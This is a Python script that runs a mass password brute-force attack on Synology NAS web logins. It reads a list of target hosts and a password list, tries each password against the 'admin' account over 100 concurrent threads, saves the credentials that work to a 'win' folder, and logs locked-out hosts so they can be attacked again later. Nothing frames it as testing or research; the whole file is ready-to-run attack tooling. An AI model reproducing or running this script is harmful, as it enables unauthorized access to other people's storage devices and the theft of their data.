import requests
import json
import os
import concurrent.futures
from datetime import datetime
###############################################################################################################
####  STEP 1:
####  Retrieve API Information
###############################################################################################################
def retrieve_api_information(host, port):

    api_information = {'success': False, 'auth_path': None, 'auth_max_version': None}
    request_string = 'http://' + host + ':' + port + '/webapi/query.cgi?api=SYNO.API.Info&version=1&method=query'
    try:
        response = requests.get(request_string, timeout=3)
    except requests.exceptions.RequestException as e:
        print (e)
        return api_information

    try:
        json_data = json.loads(response.text)
    except:
        print(host+':'+port+' - error while retrieving json data')
        return api_information

    if 'success' in json_data:
        api_information['success'] = json_data['success']
    else:
        print (host + ':' + port + ' - Unknown API')
        return api_information


    api_information['auth_path'] = json_data['data']['SYNO.API.Auth']['path']
    api_information['auth_max_version'] = json_data['data']['SYNO.API.Auth']['maxVersion']

    return api_information

###############################################################################################################
####  STEP 2:
####  Login
###############################################################################################################
def api_login(host, port, login, passwd, auth_path, auth_max_version):

    api_login = {'error': {'code': None}, 'success': False}
    request_string = 'http://' + host + ':' + port + '/webapi/' + auth_path + '?api=SYNO.API.Auth&version=' + str(
        auth_max_version) + '&method=login&account=' + login + '&passwd=' + passwd + '&session=FileStation&format=cookie'

    print(request_string)

    try:
        response = requests.get(request_string)
    except requests.exceptions.RequestException as e:
        print (e)
        api_login['success'] = False
        return api_login
    else:
        json_data = json.loads(response.text)

    if 'success' in json_data:
        api_login['success'] = json_data['success']

    if 'error' in json_data and 'code' in json_data['error']:
        api_login['error']['code'] = json_data['error']['code']

    #print(response.text)  # {"error":{"code":407},"success":false}

    return api_login

###############################################################################################################
# Saving brute result to file
###############################################################################################################
def save_result(host,port,login,passwd):

    filename = '.\\win\\'+login+'_'+passwd+'_'+host+':'+port+'.txt'

    if not os.path.exists('win'):
        os.mkdir('win')

    try:
        file = open(filename,'wt')
    except IOError as e:
        print('error opening file ' + filename)
    else:
            file.close()
            print (filename + '  was saved.')

####################################################
# Saving blocked hosts for brutforsing it later ...
#
####################################################
def save_blocked_host(host,port,login,last_passwd,blocked_time):

    filename = 'blocked_hosts.txt'
    result = host + '_' + port+ '_' + login + '_' + last_passwd + '_' + str(blocked_time)

    try:
        file = open(filename,'at')
    except IOError as e:
        print('error opening file')
    else:
        with file:
            file.write(result + '\n')
            file.close()

    print (str(result) + ' was saved to blocked_hosts.txt')

###########################
# Read passwords from file
###########################
def get_passwords ():

    passwords_list = []
    try:
      file = open('passwords.txt', 'rt')
    except IOError as e:
        print('Error opening file passwords.txt')
    else:
        with file:
            passwords_list = file.read().split('\n')
            file.close()

    return passwords_list

#######################
# Brutforcing function
# #####################
def brute(target, port, login):

    host = str(target)

    synology_api = retrieve_api_information(host, port)

    if synology_api['success'] == True:

        passwords_list = get_passwords()
        auth_path = synology_api['auth_path']
        auth_max_version = synology_api['auth_max_version']

        for passwd in passwords_list:
            #try to login
            synology_login = api_login(host, port, login, passwd, auth_path, auth_max_version)

            if synology_login['success'] == True:
                save_result(host, port, login, passwd)
                break

            if synology_login['error']['code'] != 400 and synology_login['success'] == False:
                print(str(host)+' - BLOCKED')
                blocked_time = datetime.now()
                save_blocked_host(host,port,login,passwd,blocked_time)
                break
    else:
        print (str(host) + ' - it is not Synology or unknown API')


###############################################################################################################
#Preparing for brute


#################################
# Reading target hosts from file

port = '5000'
login = 'admin'
max_workers = 100
target_hosts = []
try:
    file = open('hosts.txt', 'rt')
except IOError as e:
    print('error opening file hosts.txt')
else:
    with file:
        target_hosts = file.read().split('\n')
        file.close()
        print (str(len(target_hosts))+ ' hosts was readed from hosts.txt')


with concurrent.futures.ThreadPoolExecutor(max_workers) as executor:
    # Start the load operations and mark each future with its URL
    future_to_url = {executor.submit(brute, host, port, login): host for host in target_hosts}
    for future in concurrent.futures.as_completed(future_to_url):
        url = future_to_url[future]
        try:
            data = future.result()
        except Exception as exc:
            print('%r generated an exception: %s' % (url, exc))
        else:
            print('%r page is %d bytes' % (url, len(data)))


